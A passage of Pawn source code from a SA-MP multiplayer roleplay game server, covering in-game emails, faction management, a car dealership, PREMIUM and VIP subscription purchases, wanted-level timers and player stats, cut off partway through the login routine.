    Dialog_Show(playerid, DIALOG_EMAIL_READ, DIALOG_STYLE_MSGBOX, "Read email", gString, "Back", "Exit");
    return 1;
}

function CheckPlayerEmails(playerid)
{
    if(!cache_num_rows())
        return SCM(playerid, -1, "You don't have emails.");

    new
        emailMessage[24], readStatus;
    
    gString = "Status\tText\n";

    for(new i; i < cache_num_rows(); i++)
    {
        cache_get_field_content(i, "sMessage", emailMessage, SQL, 23);
        readStatus = cache_get_field_content_int(i, "iReadStatus");

        format(gString, sizeof gString, "%s%s\t%s%s\n", gString, (readStatus == 0 ? ("unread") : ("read")), emailMessage, (strlen(emailMessage) >= 22 ? ("...") : ("")));

        s_PlayerInfo[playerid][pSDialogItems][i] = cache_get_field_content_int(i, "ID");
    }
    Dialog_Show(playerid, DIALOG_EMAILS, DIALOG_STYLE_TABLIST_HEADERS, "Emails", gString, "Read", "Exit");
    return 1;
}

function UpdatePlayerVars(playerid)
{
    s_PlayerInfo[playerid][pSFactionOffer] = -1; format(WantName[playerid], MAX_PLAYER_NAME, "NULL");
    s_PlayerInfo[playerid][pSNewbieEnabled] = 1;

    return 1;
}

function InviteFactionMember(playerid, targetId)
{
    if(cache_num_rows() >= DynamicFactions[PlayerInfo[playerid][pMember]][fMaxMembers])
        return SendClientMessage(playerid, -1, "You have reached maximum faction members.");

    SCMF(targetId, COLOR_LIGHTBLUE, "%s has invited you to join group %s (to accept the invitation, type '/accept invite %d').", GetName(playerid), DynamicFactions[PlayerInfo[playerid][pMember]][fName], playerid);
    
    SCMF(playerid, -1, "Processing invite...");
    SCMF(playerid, -1, "You have invited %s to join your group.", GetName(targetId));
    s_PlayerInfo[targetId][pSFactionOffer] = playerid;
    return 1;
}

function ShowFactionMembers(playerid)
{
    new
        memberName[MAX_PLAYER_NAME], memberRank, memberLastOnline[24], memberFactionWarns,
        memberFactionJoined, memberSQLId, rowId=0;

    gString = "Rank - Name\tLast Login\t\tFW\tDays\n";
    for(new i, j = cache_get_row_count (); i != j; ++i)
    {
        cache_get_field_content(i, "name", memberName);
        cache_get_field_content(i, "lastOn", memberLastOnline);

        memberSQLId = cache_get_field_content_int(i, "id");
        memberRank = cache_get_field_content_int(i, "Rank");
        memberFactionWarns = cache_get_field_content_int(i, "FWarn");
        memberFactionJoined = cache_get_field_content_int(i, "FactionJoin");

        dSelected[playerid][rowId] = memberSQLId;
        format(gString, sizeof gString, "%s%d - %s\t%s\t%d/3 fw\t%d days\n", gString, memberRank, memberName, (GetPlayerID(memberName) != INVALID_PLAYER_ID ? ("online right now") : (memberLastOnline)), memberFactionWarns, TSToDays(memberFactionJoined));

        rowId++;
    }
    if(PlayerInfo[playerid][pRank] >= 6)
        Dialog_Show(playerid, DIALOG_MEMBERS, DIALOG_STYLE_TABLIST_HEADERS, "Faction members", gString, "Select", "Exit");
    else
        Dialog_Show(playerid, DIALOG_MEMBERS, DIALOG_STYLE_TABLIST_HEADERS, "Faction members", gString, "Exit", "");
    return 1;
}
YCMD:gotoxyz(playerid, params[], help)
{
    
    if(PlayerInfo[playerid][pAdmin] >= 5)
    {
        new string[128],interior,vw;
        new Float:x, Float:y, Float:z;
        if(sscanf(params, "fffii", x,y,z,interior,vw)) return sendSyntax(playerid, "/gotoxyz [x] [y] [z] [interior] [virtual]");
        {
            SetPlayerPosEx(playerid, x, y, z);
            format(string,sizeof(string),"You've teleported to x = %f, y = %f, z = %f, interior %d.",x,y,z,interior);
            SendClientMessage(playerid,COLOR_WHITE, string);
            SetPlayerVirtualWorld(playerid, vw);
            SetPlayerInterior(playerid,interior);
            s_PlayerInfo[playerid][pSInHQ] = -1;
            s_PlayerInfo[playerid][pSInHouse] = -1;
            s_PlayerInfo[playerid][pSInBusiness] = -1;
            StopAudioStreamForPlayer(playerid);
        }
    }
    else return SendClientMessage(playerid, COLOR_RED2, AdminOnly);
    return 1; }
YCMD:buycar22(playerid, params[], help) {
    if(IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_WHITE,"You need to be on foot.");
    if(IsPlayerInRangeOfPoint(playerid, 7.0, -1664.0269,1207.5439,7.2546))
    {
        if(PlayerInfo[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_RED, "[!]{ffffff} You need level 3 to view dealership cars.");
        BuyCar[playerid] = -1;
        new caption[64];
        format(caption, sizeof(caption), "Money {0b700d}($)");
        Dialog_Show(playerid,DIALOG_CARBUY, DIALOG_STYLE_TABLIST_HEADERS, caption, "#\tCategory\tMin Level\n1.\tCheap Cars\t3\n2.\tRegular Cars\t3\n3.\tExpensive Cars\t5", "Select", "Close");
    }
    else return SCM(playerid,COLOR_RED,"[!]{ffffff} You are not at the Dealership.");
    return 1; }
Dialog:DIALOG_ACCUPGRADE(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    switch(listitem) {
        case 0: {
            Dialog_Show(playerid, DIALOG_ACCUPGRADE2, DIALOG_STYLE_MSGBOX, "Premium", 
            "{FFFFFF}Contul PREMIUM ofera utilizatorilor urmatoarele beneficii:\n\n- titlu 'Premium User' vizibil deasupra capului\n- payday majorat cu 50%\n- salariul in cadrul factiunii majoratcu 50%\n- acces la chatul PREMIUM (/pc)\n- posibilitatea de a bloca mesajele primite prin whisper (/togw)\n- se pierd 2 FP-uri la fiecare payday\n- la rob se pierd doar 7 puncte (10 in mod normal)\n- /ad-uri PREMIUM\n- posibilitatea de a posta un anunt de oriunde (/ad)\n- injumatatit timpul de asteptare la plasarea unui anunt (/ad)\n- primesti un Gold Crate la achizitionare\n- venituri crescute la joburi cu 30%\n- castigurile business-urilor crescute cu 10%\n- badge PREMIUM pe profilul din panel", "Cumpara", "Exit");
        }
        case 1: {
            Dialog_Show(playerid, DIALOG_ACCUPGRADE4, DIALOG_STYLE_MSGBOX, "VIP",
            "{FFFFFF}Contul VIP ofera utilizatorilor urmatoarele beneficii:\n\n- titlu 'VIP User' vizibil deasupra capului\n- payday majorat cu 100%\n- salariul in cadrul factiunii majorat cu 100%\n- acces la chatul VIP (/vip)\n- nume colorat in chat (/pcolor)\n- culoare {FF0000}custom{FFFFFF} in chat (/vipcolor)\n- posibilitatea de a bloca mesajele primite prin whisper (/togw)\n- se pierd 3 FP-uri la fiecare payday\n- la rob se pierd doar 5 puncte (10 in mod normal)\n- la evadarea din jail se pierd doar 8 puncte (20 in mod normal)\n- /ad-uri VIP\n- posibilitatea de a posta un anunt de oriunde (/ad)\n- injumatatit timpul de asteptare la plasarea unui anunt (/ad)\n- primesti un Lenegdary Crate la achizitionare\n- venituri crescute la joburi cu 50%\n- castigurile business-urilor crescute cu 20%\n- timpul petrecut in jail scazut la jumatate\n- acces la comanda /pm pentru a putea trimite un SMS direct folosind ID-urile jucatorilor\n- badge VIP pe profil\n- acces la comanda /fixveh", "Cumpara", "Exit");
        }
    }
    return 1;
}
Dialog:DIALOG_ACCUPGRADE2(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    gString[0] = EOS;
    format(gString, sizeof gString, "#\tAccount Type\tPrice\n");
    for(new i; i < 4; i ++)
        format(gString, sizeof gString, "%s%d.\tPremium Account for {FF0000}%d{FFFFFF} days\t{909CE7}%d crystals %s\n", gString, i + 1, returnAccountDays(i + 1), returnAccountPrice(1, i + 1), returnAccountDiscount(i));

    Dialog_Show(playerid, DIALOG_ACCUPGRADE3, DIALOG_STYLE_TABLIST_HEADERS, "Premium", gString, "Cumpara", "Exit");
    return 1;
}
Dialog:DIALOG_ACCUPGRADE3(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    if(PlayerInfo[playerid][pVIPAccount] > 0)
        return sendError(playerid, "You can't do this because you have VIP Account active.");

    if(PlayerInfo[playerid][pPremiumAccount] > 0)
        return sendError(playerid, "You can't do this because you have Premium Account active.");

    if(returnPlayerCrystals(playerid) < returnAccountPrice(1, listitem + 1))
        return sendError(playerid, "You don't have %d.", returnAccountPrice(1, listitem + 1));

    PlayerInfo[playerid][pPremiumAccount] = listitem + 1;
    PlayerInfo[playerid][pPremiumAccountDays] = returnAccountDays(listitem + 1);
    PlayerInfo[playerid][pPremiumPoints] -= returnAccountPrice(1, listitem + 1);

    SCMF(playerid, -1, "{AA3333}ACCOUNT SUBSCRIPTION >> {FFFFFF}Congratulations! Now you have %d days of PREMIUM Account.", returnAccountDays(PlayerInfo[playerid][pPremiumAccount]));
    sendStaffMessage(COLOR_RED, "%s [user:%d] paid %d crystals to purchase PREMIUM Account (%d days).", 1, GetName(playerid), PlayerInfo[playerid][pSQLID], returnAccountPrice(1, listitem + 1), returnAccountDays(listitem + 1));

    UpdateDynamic3DTextLabelText(accountLabel[playerid], 0xAA3333FF, "Premium Account");
    Attach3DTextLabelToPlayer(accountLabel[playerid], playerid, 0.0, 0.0, 0.4);

    if(PlayerInfo[playerid][pPremiumAccount] < 1) Iter_Add(Premiums, playerid);

    gString[0] = EOS;
    mysql_format(SQL, gString, sizeof gString, "update `users` set `Premium` = '%d', `PremiumDays` = '%d', `PremiumPoints` = '%d' where `id` = '%d'", PlayerInfo[playerid][pPremiumAccount], PlayerInfo[playerid][pPremiumAccountDays], PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, gString, "", "");

    gString[0] = EOS;
    mysql_format(SQL, gString, sizeof gString, "insert into `shop_logs` (`playerid`, `Message`) values ('%d', '%s [user:%d] paid %d crystals to purchase PREMIUM Account (%d days).')", PlayerInfo[playerid][pSQLID], PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID], returnAccountDays(PlayerInfo[playerid][pPremiumAccount]));
    mysql_tquery(SQL, gString, "", "");

    return 1;
}
Dialog:DIALOG_ACCUPGRADE4(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    gString[0] = EOS;
    format(gString, sizeof gString, "#\tAccount Type\tPrice\n");
    for(new i; i < 4; i ++)
        format(gString, sizeof gString, "%s%d.\tVIP Account for {FF0000}%d{FFFFFF} days\t{909CE7}%d crystals %s\n", gString, i + 1, returnAccountDays(i + 1), returnAccountPrice(2, i + 1), returnAccountDiscount(i));

    Dialog_Show(playerid, DIALOG_ACCUPGRADE5, DIALOG_STYLE_TABLIST_HEADERS, "Premium", gString, "Cumpara", "Exit");
    return 1;
}
Dialog:DIALOG_ACCUPGRADE5(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    if(PlayerInfo[playerid][pPremiumAccount] > 0)
        return sendError(playerid, "You can't buy VIP Account because you have Premium Account active.");

    if(PlayerInfo[playerid][pVIPAccount] > 0)
        return sendError(playerid, "You can't do this because you have VIP Account active.");

    if(returnPlayerCrystals(playerid) < returnAccountPrice(2, listitem + 1))
        return sendError(playerid, "You don't have %d.", returnAccountPrice(2, listitem + 1));

    PlayerInfo[playerid][pVIPAccount] = listitem + 1;
    PlayerInfo[playerid][pVIPAccountDays] = returnAccountDays(listitem + 1);
    PlayerInfo[playerid][pPremiumPoints] -= returnAccountPrice(2, listitem + 1);

    SCMF(playerid, -1, "{AA3333}ACCOUNT SUBSCRIPTION >> {FFFFFF}Congratulations! Now you have %d days of VIP Account.", returnAccountDays(PlayerInfo[playerid][pVIPAccount]));
    sendStaffMessage(COLOR_RED, "%s [user:%d] paid %d crystals to purchase VIP Account (%d days).", 1, GetName(playerid), PlayerInfo[playerid][pSQLID], returnAccountPrice(2, listitem + 1), returnAccountDays(listitem + 1));

    UpdateDynamic3DTextLabelText(accountLabel[playerid], COLOR_LIGHTBLUE, "VIP Account");
    Attach3DTextLabelToPlayer(accountLabel[playerid], playerid, 0.0, 0.0, 0.4);

    if(PlayerInfo[playerid][pVIPAccount] < 1) Iter_Add(Vips, playerid);

    gString[0] = EOS;
    mysql_format(SQL, gString, sizeof gString, "update `users` set `VIP` = '%d', `VIPDays` = '%d', `PremiumPoints` = '%d' where `id` = '%d'", PlayerInfo[playerid][pVIPAccount], PlayerInfo[playerid][pVIPAccountDays], PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, gString, "", "");

    gString[0] = EOS;
    mysql_format(SQL, gString, sizeof gString, "insert into `shop_logs` (`playerid`, `Message`) values ('%d', '%s [user:%d] paid %d crystals to purchase VIP Account (%d days).')", PlayerInfo[playerid][pSQLID], PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID], returnAccountDays(PlayerInfo[playerid][pPremiumAccount]));
    mysql_tquery(SQL, gString, "", "");

    return 1;
}
Dialog:DIALOG_ACCUPGRADE6(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    gString[0] = EOS;
    format(gString, sizeof gString, "{FFFFFF}Esti sigur ca vrei sa-ti upgradezi subscriptia curenta ({AA3333}PREMIUM{FFFFFF}) la o subscriptie {AA3333}VIP{FFFFFF}?\nVei plati {339D2A}%d{FFFFFF} cristale iar cele {FF6347}%d{FFFFFF} zile de subscriptie {AA3333}PREMIUM{FFFFFF} vor deveni {AA3333}VIP{FFFFFF}.", returnConvertion(playerid), PlayerInfo[playerid][pPremiumAccountDays]);
    
    Dialog_Show(playerid, DIALOG_ACCUPGRADE7, DIALOG_STYLE_MSGBOX, "Subscription Upgrade", gString, "Da", "Nu");

    return 1;
}
Dialog:DIALOG_ACCUPGRADE7(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;
    
    if(returnPlayerCrystals(playerid) < returnConvertion(playerid))
        return sendError(playerid, "You don't have %d crystals.", returnConvertion(playerid));

    if(PlayerInfo[playerid][pPremiumAccount] == 0)
        return sendError(playerid, "An error has occurred!");

    PlayerInfo[playerid][pVIPAccount] = PlayerInfo[playerid][pPremiumAccount];
    PlayerInfo[playerid][pVIPAccountDays] = PlayerInfo[playerid][pPremiumAccountDays];
    PlayerInfo[playerid][pPremiumPoints] -= returnConvertion(playerid);

    SCMF(playerid, -1, "{AA3333}ACCOUNT SUBSCRIPTION >> {FFFFFF}You successfully upgraded your subscription to {AA3333}VIP{FFFFFF} [%d days] for %d crystals.", PlayerInfo[playerid][pPremiumAccountDays], returnConvertion(playerid));

    PlayerInfo[playerid][pPremiumAccount] = 0;
    PlayerInfo[playerid][pPremiumAccountDays] = 0;

    UpdateDynamic3DTextLabelText(accountLabel[playerid], 0xAA3333FF, "VIP Account");
    Attach3DTextLabelToPlayer(accountLabel[playerid], playerid, 0.0, 0.0, 0.4);

    if(PlayerInfo[playerid][pVIPAccount] >= 1) Iter_Add(Vips, playerid);
    if(PlayerInfo[playerid][pPremiumAccount] >= 1) Iter_Add(Premiums, playerid);

    gString[0] = EOS;
    mysql_format(SQL, gString, sizeof gString, "update `users` set `VIP` = '%d', `VIPDays` = '%d', `Premium` = '%d', `PremiumDays` = '%d', `PremiumPoints` = '%d' where `id` = '%d'", PlayerInfo[playerid][pVIPAccount], PlayerInfo[playerid][pVIPAccountDays], PlayerInfo[playerid][pPremiumAccount], PlayerInfo[playerid][pPremiumAccountDays], PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, gString, "", "");

    gString[0] = EOS;
    mysql_format(SQL, gString, sizeof gString, "insert into `shop_logs` (`playerid`, `Message`) values ('%d', '%s [user:%d] upgraded his subscription to VIP (%d days).')", PlayerInfo[playerid][pSQLID], PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID], returnAccountDays(PlayerInfo[playerid][pVIPAccountDays]));
    mysql_tquery(SQL, gString, "", "");

    return 1;
}
Dialog:DIALOG_CARBUY(playerid, response, listitem, inputtext[])
{
    if(response)
    {
        if(PlayerInfo[playerid][pLevel] < 3) return SCM(playerid, COLOR_WHITE, "You need to be level 3 to view this dealership.");
        if(listitem == 0) {
            new stringzz[2100],stringy[144];
            for(new xf = 0; xf < MAX_PERSONAL_CARS; xf++)
            {
                if(Stock[xf][vPrice] > 0 && Stock[xf][vPrice] <= 5200000)
                {
                    format(stringy, sizeof(stringy), "%s ($%s) - %d in stock\n", Stock[xf][vName], FormatNumber(Stock[xf][vPrice]), Stock[xf][vStock]);
                    strcat(stringzz,stringy);
                }
            }
            new caption[64];
            format(caption, sizeof(caption), "Money {0b700d}($)");
            Dialog_Show(playerid, DIALOG_CARBUY2, DIALOG_STYLE_LIST, caption, stringzz, "Select", "Close");
        }
        if(listitem == 1) {
            if(PlayerInfo[playerid][pLevel] < 3) return SCM(playerid, COLOR_WHITE, "You need to be level 3 to view this dealership.");
            new stringzz[2100],stringy[144];
            for(new xf = 0; xf < MAX_PERSONAL_CARS; xf++)
            {
                if(Stock[xf][vPrice] > 5200000 && Stock[xf][vPrice] <= 17000000)
                {
                    format(stringy, sizeof(stringy), "%s ($%s) - %d in stock\n", Stock[xf][vName], FormatNumber(Stock[xf][vPrice]), Stock[xf][vStock]);
                    strcat(stringzz,stringy);
                }
            }
            new caption[40];
            format(caption, sizeof(caption), "Money {0b700d}($)");
            Dialog_Show(playerid, DIALOG_CARBUY3, DIALOG_STYLE_LIST, caption, stringzz, "Select", "Close");
        }
        if(listitem == 2) {
            if(PlayerInfo[playerid][pLevel] < 5) return SCM(playerid, COLOR_WHITE, "You need to be level 5 to view this dealership.");
            new stringzz[2100],stringy[144];
            for(new xf = 0; xf < MAX_PERSONAL_CARS; xf++)
            {
                if(Stock[xf][vPrice] >= 17000001 && Stock[xf][vPrice] < 500000000)
                {
                    format(stringy, sizeof(stringy), "%s ($%s) - %d in stock\n", Stock[xf][vName], FormatNumber(Stock[xf][vPrice]), Stock[xf][vStock]);
                    strcat(stringzz,stringy);
                }
            }
            new caption[64];
            format(caption, sizeof(caption), "Money {0b700d}($)");
            Dialog_Show(playerid, DIALOG_CARBUY4, DIALOG_STYLE_LIST, caption, stringzz, "Select", "Close");
        }
        if(listitem == 3) {
            if(PlayerInfo[playerid][pLevel] < 7) return SCM(playerid, COLOR_WHITE, "You need to be level 7 to view this dealership.");
            new string2[256];
            format(string2,sizeof(string2),"Sparrow - 220 crystals\nHotring Racer B - 250 crystals\nHotring Racer A - 250 crystals\nVortex - 250 crystals\nHotring Racer - 250 crystals\nMaverick - 300 crystals");
            new caption[64];
            format(caption, sizeof(caption), "crystals {fff000}(%d)", PlayerInfo[playerid][pPremiumPoints]);
            Dialog_Show(playerid, DIALOG_CARBUY8, DIALOG_STYLE_LIST, caption, string2, "Select", "Close");
        }
    }
    return 1;
}
function showPlayerStats(playerid, targetId)
{
    new
        houseString[24], bizString[24];
    new clantext[ 32 ], clanrankma[ 32 ];
    if( PlayerInfo[ targetId ][ pClan ] )
    {
        format( clantext, 32 , ClanInfo[ PlayerInfo[targetId][pClan] ][ cName ] );
        format( clanrankma, 32, CRank[ PlayerInfo[targetId][pClan] ][ PlayerInfo[targetId][pClanRank] ] );
    }
    else
    {
        format( clantext, 32 , "None");
        format( clanrankma, 32, "None" );
    }
    format(houseString, 24, PlayerInfo[targetId][pHouse] && PlayerInfo[targetId][pSQLID] == HouseInfo[PlayerInfo[targetId][pHouse]][hOwner] ? ("house %d") : ("no house"), PlayerInfo[targetId][pHouse]);
    format(bizString, 24, PlayerInfo[targetId][pBusiness] && PlayerInfo[targetId][pSQLID] == BizInfo[PlayerInfo[targetId][pBusiness]][bOwner] ? ("house %d") : ("no house"), PlayerInfo[targetId][pBusiness]);

    SCMF(playerid, -1, "{909CE7}General:{ffffff} %s [%d] | played: %.2f hours, phone: %s, (number: %d), job: %s, warns: %d/3", GetName(targetId), targetId, PlayerInfo[targetId][pConnectTime], (PlayerInfo[targetId][pPnumber] != 0 ? ("yes") : ("no")), PlayerInfo[targetId][pPnumber], job::returnJobName(job_data[playerid][playerJob]), PlayerInfo[targetId][pWarns]);
    SCMF(playerid, -1, "{909CE7}Account:{ffffff} level %d (%d/%d respect points), gender: %s, Clan: %s , Clan Rank: %s.", PlayerInfo[targetId][pLevel], PlayerInfo[targetId][pExp], returnLevelReq(PlayerInfo[targetId][pLevel], 1), (PlayerInfo[targetId][pSex] == 1 ? ("male") : ("female")), clantext, clanrankma);
    SCMF(playerid, -1, "{909CE7}Economy:{ffffff} money: $%s (cash) | $%s (bank), %s, %s", FormatNumber(GetPlayerCash(targetId)), GetPlayerBank(playerid), houseString, bizString);
    SCMF(playerid, -1, "{909CE7}Shop:{ffffff} %s, %s crystals", (PlayerInfo[targetId][pPremiumAccount] != 0 ? ("PREMIUM Account") : PlayerInfo[targetId][pVIPAccount] != 0 ? ("VIP Account") : ("no subscription found")), FormatNumber(PlayerInfo[targetId][pPremiumPoints]));
    if(PlayerInfo[targetId][pMember] >= 1)
        SCMF(playerid, -1, "{909CE7}Faction:{ffffff} %s | rank: %d, member for %d days", NumeFactiune(PlayerInfo[targetId][pMember]), PlayerInfo[targetId][pRank], TSToDays(PlayerInfo[targetId][pFactionJoin]));
    else
        SCMF(playerid, -1, "{909CE7}Faction:{ffffff} None, %d/20 faction punish", PlayerInfo[targetId][pFpunish]);
    if(PlayerInfo[playerid][pAdmin] >= 1) SCMF(playerid, -1, "{909CE7}Admin:{ffffff} interior: %d, virtual world: %d, jail: %d, wanted: %d, duty: %d, seconds: %d", GetPlayerInterior(targetId), GetPlayerVirtualWorld(targetId), PlayerInfo[targetId][pJailTime], PlayerInfo[targetId][pWantedLevel], s_PlayerInfo[targetId][pSOnDuty], 0);
    return 1;
}

function WhenPlayerGotUninvited(playerid, returnPunish)
{
    Iter_Remove(FactionMembers<PlayerInfo[playerid][pMember]>, playerid);
    
    if(IsACop(playerid))
        Iter_Remove(Cops, playerid);

    PlayerInfo[playerid][pMember] = 0;

    if(PlayerInfo[playerid][pRank] == 7)
        Iter_Remove(Leaders, playerid);

    PlayerInfo[playerid][pRank] = 0;
    PlayerInfo[playerid][pFactionTime] = 0;
    PlayerInfo[playerid][pFACWarns] = 0;

    PlayerInfo[playerid][pFpunish] = returnPunish;

    s_PlayerInfo[playerid][pSOnDuty] = false;
    return 1;
}

function PreloadPlayerAnimations(playerid)
{
    PreloadAnimLib(playerid, "BOMBER");
    PreloadAnimLib(playerid, "RAPPING");
    PreloadAnimLib(playerid, "SHOP");
    PreloadAnimLib(playerid, "BEACH");
    PreloadAnimLib(playerid, "SMOKING");
    PreloadAnimLib(playerid, "FOOD");
    PreloadAnimLib(playerid, "ON_LOOKERS");
    PreloadAnimLib(playerid, "DEALER");
    PreloadAnimLib(playerid, "MISC");
    PreloadAnimLib(playerid, "SWEET");
    PreloadAnimLib(playerid, "RIOT");
    PreloadAnimLib(playerid, "PED");
    PreloadAnimLib(playerid, "POLICE");
    PreloadAnimLib(playerid, "CRACK");
    PreloadAnimLib(playerid, "CARRY");
    PreloadAnimLib(playerid, "COP_AMBIENT");
    PreloadAnimLib(playerid, "PARK");
    PreloadAnimLib(playerid, "INT_HOUSE");
    PreloadAnimLib(playerid, "FOOD");
}

function showQuestProgress(playerid)
{
    SCM(playerid, COLOR_DCHAT, "Quest-uri zilnice:");
    for(new i; i < 3; ++i)
    {
        format(gString, sizeof gString, GetQuestName(playerid, PlayerInfo[playerid][pQuest][i]), PlayerInfo[playerid][pQuestNeed][i]);
        
        if(PlayerInfo[playerid][pQuestProgress][i] < PlayerInfo[playerid][pQuestNeed][i])
            SCMF(playerid, COLOR_YELLOW, "Misiune: %s. | Progres: %d/%d", gString, PlayerInfo[playerid][pQuestProgress][i], PlayerInfo[playerid][pQuestNeed][i]);
    }
    return 1;
}

function proceed_delay(playerid, const pvar[])
{
	if(!GetPVarInt(playerid, pvar))
		return 1;

	if(GetPVarInt(playerid, pvar) - gettime() >= 60)
	{
		#if defined SV_TESTE
			ABroadCast(COLOR_DCHAT, 7, "[DELAY UPDATE] pVar %s updated to %d.", pvar, gettime());
		#endif

		if(strmatch(pvar, "wanted_time"))
		{
			format(gString, sizeof gString, "wanted scade in: ~r~%02d minute", (GetPVarInt(playerid, "wanted_time") - gettime()) / 60);
			PlayerTextDrawSetString(playerid, WantedTD[playerid], gString);
			PlayerTextDrawShow(playerid, WantedTD[playerid]);
		}
	}

	if((GetPVarInt(playerid, pvar) - gettime()) < 60 && GetPVarInt(playerid, pvar) >= 1)
	{
		#if defined SV_TESTE
			ABroadCast(COLOR_DCHAT, 7, "[DELAY UPDATE] pVar %s updated to %d. [time < 60 sec | %d seconds left]", pvar, gettime(), GetPVarInt(playerid, pvar) - gettime());
		#endif

		if(strmatch(pvar, "wanted_time"))
		{
			PlayerTextDrawSetString(playerid, WantedTD[playerid], "wanted scade in: ~r~01 minute"); //cateva secunde
			PlayerTextDrawShow(playerid, WantedTD[playerid]);
		}
	}
	
	if(GetPVarInt(playerid, pvar) <= gettime())
	{
		#if defined SV_TESTE
			ABroadCast(COLOR_DCHAT, 7, "[DELAY UPDATE] pVar %s was deleted. [%d sec since delay passed]", pvar, GetPVarInt(playerid, pvar) - gettime());
		#endif

		DeletePVar(playerid, pvar);
		if(strmatch(pvar, "wanted_time"))
		{
			PlayerInfo[playerid][pWantedLevel] --;
			SetPlayerWanted(playerid);

			SCM(playerid, COLOR_LIGHTBLUE, "You lost one wanted points because you ran by police.");
			sendDepartmentMessage(1, COLOR_BLUE, "%s(%d) lost one wanted points because it ran by police.", GetName(playerid), playerid);
		}
	}
	return 1;
}

function sendDepartmentMessage(dutyStatus, color, const string[], va_args<>)
{
	new
		stringMessage[144];

	va_format(stringMessage, sizeof stringMessage, string, va_start<3>);

	foreach(new i : Cops)
	{
		if(!s_PlayerInfo[i][pSLoggedIn] || dutyStatus == 1 && !s_PlayerInfo[i][pSOnDuty])
			continue;

		SCM(i, color, stringMessage);
	}

	return 1;
}

function ClearCrime(playerid)
{
	PlayerInfo[playerid][pWantedLevel] = 0;
	DeletePVar(playerid, "wanted_time");

	Iter_Remove(WantedPlayers, playerid);
	PlayerTextDrawHide(playerid, WantedTD[playerid]);

    format(PlayerInfo[playerid][pVictim], 32, "********");
    format(PlayerInfo[playerid][pAccused], 32, "********");

    format(PlayerInfo[playerid][pCrime1], 64, "Fara Crima");
    format(PlayerInfo[playerid][pCrime2], 64, "Fara Crima");
    format(PlayerInfo[playerid][pCrime3], 64, "Fara Crima");

    mysql_format(SQL, gString, sizeof gString, "update `users` set `Crime1` = '%s', `Crime2` = '%s', `Crime3` = '%s', `Accused` = '%s', `Victim` = '%s', `WantedLevel` = '%d' where `id` = '%d';", PlayerInfo[playerid][pCrime1], PlayerInfo[playerid][pCrime2], PlayerInfo[playerid][pCrime3], PlayerInfo[playerid][pAccused], PlayerInfo[playerid][pVictim], PlayerInfo[playerid][pWantedLevel], PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, gString, "", "");

	return SetPlayerWantedLevel(playerid, 0);
}

function SetPlayerWanted(playerid)
{
	if(!Iter_Contains(WantedPlayers, playerid))
		Iter_Add(WantedPlayers, playerid);

	if(PlayerInfo[playerid][pWantedLevel])
	{
		SetPVarInt(playerid, "wanted_time", gettime() + 300);

		format(gString, sizeof gString, "wanted scade in: ~r~%02d minute", (GetPVarInt(playerid, "wanted_time") - gettime()) / 60);
		PlayerTextDrawSetString(playerid, WantedTD[playerid], gString);
		PlayerTextDrawShow(playerid, WantedTD[playerid]);
	}
	else
		ClearCrime(playerid);

	SetPlayerWantedLevel(playerid, PlayerInfo[playerid][pWantedLevel]);

	mysql_format(SQL, gString, sizeof gString, "update `users` set `WantedLevel` = '%d' where `id` = '%d';", PlayerInfo[playerid][pWantedLevel], PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gString, "", "");
	return 1;
}

function SetPlayerSkinEx(playerid)
{
	if(s_PlayerInfo[playerid][pSOnDuty])
	{
		if(PlayerInfo[playerid][pSex] == 1) 
			SetPlayerSkin(playerid, FactionSkin[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]-1]);
		else 
			SetPlayerSkin(playerid, FactionSkin[PlayerInfo[playerid][pMember]][7]);
	}
	else SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
	return 1; }

function SS(playerid, color, const ro[], const en[])
{
    switch(PlayerInfo[playerid][pLanguage])
    {
        case 1: SendSplitMessage(playerid, color, en);
        case 2: SendSplitMessage(playerid, color, ro);
        default: SendSplitMessage(playerid, color, ro);
    }
    return 1;
}

function SendFamilyMessage(family, color, duty, const text[], va_args<>)
{
	new
		stringMessage[256];
	
	va_format(stringMessage, 256, text, va_start<4>);
	foreach(new i : FactionMembers<family>)
	{
		if(PlayerInfo[i][pMember] == family && s_PlayerInfo[i][pSOnDuty] == 0)
		{
			if(!s_PlayerInfo[i][pSTogFaction])
				SendSplitMessage(i, color, stringMessage);
		}
		if(s_PlayerInfo[i][pSFactionSpec] == family && PlayerInfo[i][pAdmin] >= 1)
			SendSplitMessage(i, COLOR_RADIOCHAT, stringMessage);
	}
	return 1;
}	

function updateLevelProgress(playerid)
{
    if(!PlayerInfo[playerid][pHUD][5])
        return 1;

    format(gString, sizeof gString, "Level: %d (%d/%d RESPECT)", PlayerInfo[playerid][pLevel], PlayerInfo[playerid][pExp], PlayerInfo[playerid][pLevel] * 3);
    PlayerTextDrawSetString(playerid, HudTD[playerid], gString);
    PlayerTextDrawShow(playerid, HudTD[playerid]);
    
    SetPlayerProgressBarMaxValue(playerid, HUDProgress[playerid], PlayerInfo[playerid][pLevel] * 3);
    SetPlayerProgressBarValue(playerid, HUDProgress[playerid], PlayerInfo[playerid][pExp]);
    SetPlayerProgressBarColour(playerid, HUDProgress[playerid], 0x909CE7AA);

    return ShowPlayerProgressBar(playerid, HUDProgress[playerid]);
}

function LoginTransfer(playerid)
{
    proceed_connect_camera(playerid);
	for(new i; i < 20; ++i)
		SCM(playerid, -1, "");
    SCM(playerid, COLOR_RED, "You will be logged in now.");
	SCM(playerid, COLOR_GENANNOUNCE, "SERVER: {FFFFFF}Welcome to LocalHost RPG.");

	if(s_PlayerInfo[playerid][pSAccountExist])
	{
